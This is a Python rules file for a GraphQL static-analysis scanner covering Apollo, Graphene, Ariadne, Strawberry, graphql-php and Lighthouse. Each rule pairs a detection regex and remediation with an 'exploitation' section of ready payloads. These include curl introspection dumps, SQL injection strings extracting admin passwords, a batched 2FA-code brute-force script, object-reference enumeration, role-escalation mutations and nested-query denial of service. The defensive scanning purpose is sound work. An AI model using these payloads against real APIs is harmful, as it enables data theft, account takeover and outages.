"""
GraphQL security rules for static analysis.
Covers Apollo Server, Express-GraphQL, Yoga (JS/TS),
Graphene, Ariadne, Strawberry (Python),
and webonyx/graphql-php, Lighthouse (PHP).
"""

from typing import List
from rules import SecurityRule, Severity


# =============================================================================
# JAVASCRIPT / TYPESCRIPT GRAPHQL RULES
# =============================================================================

GRAPHQL_JS_RULES: List[SecurityRule] = [
    # -------------------------------------------------------------------------
    # INTROSPECTION / SCHEMA EXPOSURE
    # -------------------------------------------------------------------------
    SecurityRule(
        id="GQL-JS-001",
        name="GraphQL Introspection Enabled",
        pattern=r"introspection\s*:\s*true",
        severity=Severity.MEDIUM,
        category="GraphQL Misconfiguration",
        cwe_id="CWE-200",
        description="GraphQL introspection is explicitly enabled. Attackers can enumerate the entire schema, discovering types, fields, queries, mutations, and subscriptions.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  GRAPHQL INTROSPECTION ENUMERATION                                          ║
╚══════════════════════════════════════════════════════════════════════════════╝

FULL SCHEMA DUMP:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

curl -s -X POST http://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}'

FULL INTROSPECTION QUERY:
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
  }
}

LIST ALL QUERIES/MUTATIONS:
{__schema{queryType{fields{name description args{name type{name}}}}}}
{__schema{mutationType{fields{name description args{name type{name}}}}}}

TOOLS:
- InQL (Burp Suite extension): Auto-generates queries from introspection
- graphql-cop: python graphql-cop -t http://target.com/graphql
- Clairvoyance: Schema recovery even when introspection is disabled""",
        remediation="Disable introspection in production: new ApolloServer({ introspection: false }). Use libraries like graphql-disable-introspection for Express-GraphQL."
    ),
    SecurityRule(
        id="GQL-JS-002",
        name="GraphQL Playground/GraphiQL Enabled",
        pattern=r"(playground|graphiql)\s*:\s*true",
        severity=Severity.MEDIUM,
        category="GraphQL Misconfiguration",
        cwe_id="CWE-489",
        description="GraphQL Playground or GraphiQL is enabled. These interactive IDE tools expose the full schema and allow arbitrary query execution in production.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  GRAPHQL PLAYGROUND / GRAPHIQL EXPOSURE                                     ║
╚══════════════════════════════════════════════════════════════════════════════╝

DISCOVERY:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Browse to these URLs:
- http://target.com/graphql
- http://target.com/graphiql
- http://target.com/playground
- http://target.com/graphql/playground

EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Use the built-in schema explorer (Docs panel) to map the API
2. Craft and execute queries/mutations directly in the IDE
3. Test for authorization bypass by running admin mutations
4. Exfiltrate data through queries without authentication
5. Set HTTP headers in the playground to test with stolen tokens""",
        remediation="Disable in production: new ApolloServer({ playground: false }). For Express-GraphQL: graphqlHTTP({ graphiql: process.env.NODE_ENV !== 'production' })."
    ),

    # -------------------------------------------------------------------------
    # DEBUG / ERROR EXPOSURE
    # -------------------------------------------------------------------------
    SecurityRule(
        id="GQL-JS-003",
        name="GraphQL Debug Mode Enabled",
        pattern=r"(ApolloServer|GraphQLServer|createYoga|createHandler|graphqlHTTP)\s*\(\s*\{[^}]*debug\s*:\s*true",
        severity=Severity.HIGH,
        category="GraphQL Misconfiguration",
        cwe_id="CWE-209",
        description="GraphQL server debug mode is enabled, exposing detailed error messages including stack traces and internal paths.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  GRAPHQL DEBUG MODE - INFORMATION DISCLOSURE                                ║
╚══════════════════════════════════════════════════════════════════════════════╝

EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Send malformed queries to trigger errors:
   curl -X POST http://target.com/graphql \\
     -H "Content-Type: application/json" \\
     -d '{"query":"{ nonExistentField }"}'

2. Check response for:
   - Stack traces with file paths
   - Database connection strings
   - Internal service URLs
   - Framework/library versions

3. Force type errors:
   {"query":"{ user(id: \\"not_a_number\\") { name } }"}

INFORMATION GATHERED:
- Internal file structure from stack traces
- Database type and version from connection errors
- Third-party service endpoints from resolver errors""",
        remediation="Disable debug in production: new ApolloServer({ debug: false }). Use a custom formatError that strips sensitive details."
    ),
    SecurityRule(
        id="GQL-JS-004",
        name="GraphQL Verbose Error Passthrough",
        pattern=r"formatError\s*[=:]\s*\(?[^)]*\)?\s*=>\s*[^{]*\{?[^}]*(error\.message|error\.stack|error\.extensions|originalError|err\.stack)",
        severity=Severity.MEDIUM,
        category="GraphQL Misconfiguration",
        cwe_id="CWE-209",
        description="formatError handler passes through internal error details (stack traces, original errors) to API responses.",
        exploitation="""
VERBOSE ERROR EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Trigger errors by sending invalid queries or arguments
2. Check if stack traces, file paths, or internal details leak
3. Look for error.extensions.exception containing full error objects
4. Database errors may reveal table names, column names, query structure

TESTING:
curl -X POST http://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"mutation { deleteUser(id: \\"sqli_test\\") { id } }"}'""",
        remediation="Strip sensitive details in formatError: return only a generic message and an error code. Never expose error.stack or originalError to clients."
    ),

    # -------------------------------------------------------------------------
    # DENIAL OF SERVICE
    # -------------------------------------------------------------------------
    SecurityRule(
        id="GQL-JS-005",
        name="GraphQL Batching Enabled Without Limits",
        pattern=r"allowBatchedHttpRequests\s*:\s*true",
        severity=Severity.MEDIUM,
        category="GraphQL DoS",
        cwe_id="CWE-770",
        description="GraphQL HTTP batching is enabled without apparent limits. Attackers can send arrays of queries to bypass rate limiting or perform brute-force attacks.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  GRAPHQL BATCHING ABUSE                                                     ║
╚══════════════════════════════════════════════════════════════════════════════╝

RATE LIMIT BYPASS VIA BATCHING:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Send 100 login attempts in a single HTTP request
curl -X POST http://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '[
    {"query":"mutation{login(email:\\"admin@test.com\\",password:\\"pass1\\"){token}}"},
    {"query":"mutation{login(email:\\"admin@test.com\\",password:\\"pass2\\"){token}}"},
    {"query":"mutation{login(email:\\"admin@test.com\\",password:\\"pass3\\"){token}}"}
  ]'

BRUTE FORCE OTP/2FA:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Batch all 10000 possible 4-digit OTPs
python -c "
import json
queries = [{'query': f'mutation{{verify2FA(code:\\\"{i:04d}\\\"){{token}}}}'} for i in range(10000)]
print(json.dumps(queries))
" | curl -X POST http://target.com/graphql \\
  -H "Content-Type: application/json" -d @-

ALIAS-BASED BATCHING (works even without HTTP batching):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{
  a1: login(email:"admin@test.com", password:"pass1") { token }
  a2: login(email:"admin@test.com", password:"pass2") { token }
  a3: login(email:"admin@test.com", password:"pass3") { token }
}""",
        remediation="Limit batch size: new ApolloServer({ allowBatchedHttpRequests: true, maxBatchSize: 5 }). Apply rate limiting per operation, not per HTTP request."
    ),

    # -------------------------------------------------------------------------
    # INJECTION IN RESOLVERS
    # -------------------------------------------------------------------------
    SecurityRule(
        id="GQL-JS-006",
        name="SQL Injection in GraphQL Resolver",
        pattern=r"(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\s+.*args\.|\.query\s*\([^)]*args\.",
        severity=Severity.CRITICAL,
        category="SQL Injection",
        cwe_id="CWE-89",
        description="GraphQL resolver builds SQL queries using args (user input from GraphQL arguments) via string concatenation.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  SQL INJECTION VIA GRAPHQL ARGUMENTS                                        ║
╚══════════════════════════════════════════════════════════════════════════════╝

EXAMPLE VULNERABLE RESOLVER:
resolve: (parent, args) => {
  return db.query(`SELECT * FROM users WHERE id = ${args.id}`);
}

EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Via GraphQL query
{ user(id: "1 OR 1=1 --") { name email } }

# UNION-based extraction
{ user(id: "1 UNION SELECT username,password,null FROM admins --") { name email } }

# Time-based blind
{ user(id: "1; SELECT SLEEP(5) --") { name } }

# Curl
curl -X POST http://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{ user(id: \\"1 OR 1=1 --\\") { name email } }"}'""",
        remediation="Use parameterized queries in resolvers: db.query('SELECT * FROM users WHERE id = ?', [args.id]). Never concatenate args into SQL."
    ),
    SecurityRule(
        id="GQL-JS-007",
        name="Unsafe Direct Object Reference in GraphQL Resolver",
        pattern=r"(findById|findOne|findByPk|findUnique|findFirst)\s*\(\s*(args\.|context\.params|parent\.)",
        severity=Severity.HIGH,
        category="GraphQL Authorization",
        cwe_id="CWE-639",
        description="GraphQL resolver passes user-supplied args directly to database lookup without authorization check. May allow accessing other users' data.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  BROKEN OBJECT LEVEL AUTHORIZATION (BOLA) IN GRAPHQL                        ║
╚══════════════════════════════════════════════════════════════════════════════╝

EXAMPLE VULNERABLE RESOLVER:
resolve: (parent, args, context) => {
  return User.findById(args.id);  // No check: does context.user own this?
}

EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Enumerate user IDs
{ user(id: "1") { name email ssn } }
{ user(id: "2") { name email ssn } }
{ user(id: "3") { name email ssn } }

# Try UUIDs if integer IDs fail
{ order(id: "550e8400-e29b-41d4-a716-446655440000") { total items { name } } }

# Use alias batching to enumerate in one request
{
  u1: user(id: "1") { name email }
  u2: user(id: "2") { name email }
  u3: user(id: "3") { name email }
}

# Try accessing admin-only mutations
mutation { deleteUser(id: "1") { success } }
mutation { updateRole(userId: "2", role: ADMIN) { id role } }""",
        remediation="Always verify authorization in resolvers: check that context.user has permission to access the requested resource. Use middleware like graphql-shield."
    ),

    # -------------------------------------------------------------------------
    # ENDPOINT EXPOSURE
    # -------------------------------------------------------------------------
    SecurityRule(
        id="GQL-JS-008",
        name="GraphQL Endpoint Without Authentication Middleware",
        pattern=r"app\.(use|post|get|all)\s*\(\s*['\"]\/graphql['\"]",
        severity=Severity.MEDIUM,
        category="GraphQL Authorization",
        cwe_id="CWE-306",
        description="GraphQL endpoint route registered directly on the app. Verify that authentication middleware is applied before this route.",
        exploitation="""
UNAUTHENTICATED GRAPHQL ACCESS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Test if endpoint is accessible without authentication:
   curl -X POST http://target.com/graphql \\
     -H "Content-Type: application/json" \\
     -d '{"query":"{ __typename }"}'

2. If accessible, run introspection to map the API
3. Execute queries and mutations without auth tokens
4. Look for sensitive data in query responses

CHECK COMMON PATHS:
- /graphql
- /api/graphql
- /v1/graphql
- /query
- /gql""",
        remediation="Apply authentication middleware before the GraphQL route: app.use('/graphql', authMiddleware, graphqlHandler). Or use context-level auth checks in every resolver.",
        false_positive_hints=["authenticate", "authMiddleware", "passport", "requireAuth", "isAuthenticated"]
    ),
    SecurityRule(
        id="GQL-JS-009",
        name="GraphQL Schema Served as Static File",
        pattern=r"(express\.static|serveStatic|sendFile|createReadStream)\s*\([^)]*\.(graphql|gql|sdl)",
        severity=Severity.MEDIUM,
        category="GraphQL Misconfiguration",
        cwe_id="CWE-200",
        description="GraphQL schema definition files (.graphql/.gql) appear to be served as static assets, exposing the full API schema.",
        exploitation="""
SCHEMA FILE DISCOVERY:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Try fetching schema files directly
curl http://target.com/schema.graphql
curl http://target.com/schema.gql
curl http://target.com/api/schema.graphql
curl http://target.com/graphql/schema.sdl

The schema reveals all types, queries, mutations, and their arguments -
equivalent to introspection but via file access.""",
        remediation="Never serve schema files as static assets. If schema sharing is needed, use authenticated endpoints."
    ),
]


# =============================================================================
# PYTHON GRAPHQL RULES
# =============================================================================

GRAPHQL_PYTHON_RULES: List[SecurityRule] = [
    SecurityRule(
        id="GQL-PY-001",
        name="GraphQL Introspection Enabled (Python)",
        pattern=r"introspection\s*=\s*True",
        severity=Severity.MEDIUM,
        category="GraphQL Misconfiguration",
        cwe_id="CWE-200",
        description="GraphQL introspection is explicitly enabled in Python GraphQL framework (Graphene, Ariadne, Strawberry). Attackers can enumerate the full schema.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  GRAPHQL INTROSPECTION - PYTHON FRAMEWORKS                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝

EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

curl -X POST http://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}'

FRAMEWORK-SPECIFIC DEFAULTS:
- Graphene: introspection enabled by default
- Ariadne: introspection enabled by default
- Strawberry: introspection enabled by default

All require explicit opt-out for production.""",
        remediation="Disable introspection: Schema(query=Query, introspection=False) for Graphene. For Ariadne: make_executable_schema with introspection=False. For Strawberry: strawberry.Schema(query=Query, introspection=False)."
    ),
    SecurityRule(
        id="GQL-PY-002",
        name="GraphQL Debug Mode (Python)",
        pattern=r"(GraphQL|GraphQLView|GraphQLRouter|GraphQLHTTPHandler)\s*\([^)]*debug\s*=\s*True",
        severity=Severity.HIGH,
        category="GraphQL Misconfiguration",
        cwe_id="CWE-209",
        description="GraphQL server debug mode enabled in Python framework. Exposes detailed error messages and stack traces.",
        exploitation="""
PYTHON GRAPHQL DEBUG MODE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. Send malformed queries to trigger verbose errors
2. Check error responses for:
   - Python stack traces with file paths
   - Database query details
   - Internal variable values
   - ORM model structure

TESTING:
curl -X POST http://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{ __nonexistent }"}'""",
        remediation="Disable debug in production: GraphQL(schema, debug=False). Use DEBUG=False in Django/Flask settings."
    ),
    SecurityRule(
        id="GQL-PY-003",
        name="SQL Injection in Python GraphQL Resolver",
        pattern=r"(execute|cursor\.|\.raw|\.extra)\s*\([^)]*\b(info\.(context|variable_values)|kwargs\[|args\[|root\.).*(%|\.format|f['\"]|\+)",
        severity=Severity.CRITICAL,
        category="SQL Injection",
        cwe_id="CWE-89",
        description="Python GraphQL resolver builds SQL using string formatting with resolver arguments (info.context, kwargs, args).",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  SQL INJECTION IN PYTHON GRAPHQL RESOLVER                                   ║
╚══════════════════════════════════════════════════════════════════════════════╝

EXAMPLE VULNERABLE CODE:
def resolve_user(root, info, id):
    cursor.execute(f"SELECT * FROM users WHERE id = {id}")

PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{ user(id: "1 OR 1=1 --") { name email } }
{ user(id: "1 UNION SELECT username,password FROM auth_user --") { name } }
{ user(id: "1; SELECT pg_sleep(5) --") { name } }""",
        remediation="Use parameterized queries: cursor.execute('SELECT * FROM users WHERE id = %s', [id]). Use Django ORM or SQLAlchemy instead of raw SQL."
    ),
]


# =============================================================================
# PHP GRAPHQL RULES
# =============================================================================

GRAPHQL_PHP_RULES: List[SecurityRule] = [
    SecurityRule(
        id="GQL-PHP-001",
        name="GraphQL Debug Mode (PHP)",
        pattern=r"(DebugFlag\s*::\s*(INCLUDE_DEBUG_MESSAGE|INCLUDE_TRACE|RETHROW_INTERNAL_EXCEPTIONS|RETHROW_UNSAFE_EXCEPTIONS)|['\"]debug['\"]\s*=>\s*true)",
        severity=Severity.HIGH,
        category="GraphQL Misconfiguration",
        cwe_id="CWE-209",
        description="GraphQL debug flags enabled in webonyx/graphql-php or Lighthouse. Exposes internal error details to API consumers.",
        exploitation="""
╔══════════════════════════════════════════════════════════════════════════════╗
║  PHP GRAPHQL DEBUG FLAGS                                                    ║
╚══════════════════════════════════════════════════════════════════════════════╝

webonyx/graphql-php DEBUG FLAGS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

DebugFlag::INCLUDE_DEBUG_MESSAGE   - Adds debug messages to errors
DebugFlag::INCLUDE_TRACE           - Adds full PHP stack traces
DebugFlag::RETHROW_INTERNAL_EXCEPTIONS - Re-throws for debuggers
DebugFlag::RETHROW_UNSAFE_EXCEPTIONS   - Dangerous in production

EXPLOITATION:
1. Send malformed queries to trigger errors
2. Check for PHP file paths in stack traces
3. Look for database details in error messages
4. Extract framework/library versions""",
        remediation="Remove debug flags in production: GraphQL::executeQuery($schema, $query) without debug parameter. In Lighthouse: set debug to 0 in config/lighthouse.php."
    ),
    SecurityRule(
        id="GQL-PHP-002",
        name="GraphQL Introspection Enabled (PHP)",
        pattern=r"(introspection|DisableIntrospection)\s*=>\s*(true|false)|new\s+DisableIntrospection",
        severity=Severity.MEDIUM,
        category="GraphQL Misconfiguration",
        cwe_id="CWE-200",
        description="GraphQL introspection configuration detected. Verify introspection is disabled in production to prevent schema enumeration.",
        exploitation="""
PHP GRAPHQL INTROSPECTION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

If introspection is enabled, enumerate the schema:

curl -X POST http://target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}'

webonyx/graphql-php requires manually adding DisableIntrospection
validation rule - if not present, introspection is ON by default.

Lighthouse (Laravel): Check config/lighthouse.php for security settings.""",
        remediation="Add DisableIntrospection validation rule: DocumentValidator::addRule(new DisableIntrospection()). In Lighthouse: set 'security.disable_introspection' => true in config."
    ),
    SecurityRule(
        id="GQL-PHP-003",
        name="GraphQL Query Depth/Complexity Not Limited (PHP)",
        pattern=r"(QueryComplexity|QueryDepth)\s*::\s*(setMaxQueryDepth|setMaxQueryComplexity)\s*\(\s*(\d{3,}|QueryComplexity::DISABLED|QueryDepth::DISABLED)",
        severity=Severity.MEDIUM,
        category="GraphQL DoS",
        cwe_id="CWE-770",
        description="GraphQL query depth or complexity limits are either disabled or set excessively high in webonyx/graphql-php.",
        exploitation="""
GRAPHQL DEPTH/COMPLEXITY ATTACK:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Deeply nested query to cause DoS
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              name
            }
          }
        }
      }
    }
  }
}

# Wide query with aliases
{
  a1: users(first: 100) { name posts { title comments { text } } }
  a2: users(first: 100) { name posts { title comments { text } } }
  a3: users(first: 100) { name posts { title comments { text } } }
}""",
        remediation="Set reasonable limits: QueryComplexity::setMaxQueryComplexity(100) and QueryDepth::setMaxQueryDepth(10)."
    ),
]


# Summary statistics
GRAPHQL_JS_TOTAL = len(GRAPHQL_JS_RULES)
GRAPHQL_PYTHON_TOTAL = len(GRAPHQL_PYTHON_RULES)
GRAPHQL_PHP_TOTAL = len(GRAPHQL_PHP_RULES)
GRAPHQL_TOTAL_RULES = GRAPHQL_JS_TOTAL + GRAPHQL_PYTHON_TOTAL + GRAPHQL_PHP_TOTAL
GRAPHQL_CATEGORIES = list(set(
    r.category for r in GRAPHQL_JS_RULES + GRAPHQL_PYTHON_RULES + GRAPHQL_PHP_RULES
))
